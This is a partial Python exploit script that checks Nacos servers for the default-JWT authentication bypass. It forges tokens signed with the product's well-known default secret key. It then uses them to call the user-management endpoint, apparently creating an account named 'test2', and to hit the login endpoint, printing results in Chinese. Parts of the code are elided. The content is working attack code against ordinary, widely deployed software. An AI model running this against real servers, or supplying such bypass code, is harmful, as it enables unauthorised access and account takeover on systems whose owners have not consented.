...
def jwtGenerate():
    tmr_time = datetime.datetime.now()+datetime.timedelta(days=1)
    timestamp = int(tmr_time.timestamp())
    header = {
        "alg": "HS256",
        "typ": "JWT"
    }
    ...
    key = base64.b64encode("SecretKey012345678901234567890123456789012345678901234567890123456789".encode('utf-8')).decode('utf-8')

    token = jwt.encode(payload=payload, key=key, algorithm='HS256', headers=header)
    return token
def title():
    print("* " * 20)
...
def poc4(url):
    ...
    if url.endswith("/"):
        path = f"nacos/v1/auth/users?accessToken={jwtGenerate()}"
    else:
        path = f"/nacos/v1/auth/users?accessToken={jwtGenerate()}"
    data = {
        "username": "test2",
...
def poc5(url):
    print("正在检测是否存在默认JWT身份认证绕过漏洞")
    head = {
    'User-Agent':"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
    'Content-Type':"application/x-www-form-urlencoded",
    'Connection': 'close',
    'Authorization': f"Bearer {jwtGenerate()}"
    }
    if url.endswith("/"):
        path = "nacos/v1/auth/users/login"
    else:
    ...
    checkpoc5 = requests.post(url=url + path, headers=head, data=data, verify=False)
    if checkpoc5.status_code == 200 and ("Authorization" in checkpoc5.headers):
        print(Fore.GREEN + url + "[+]存在默认JWT身份认证绕过漏洞")
    else:
        print(Fore.RED + "[-]不存在默认JWT身份认证绕过漏洞")
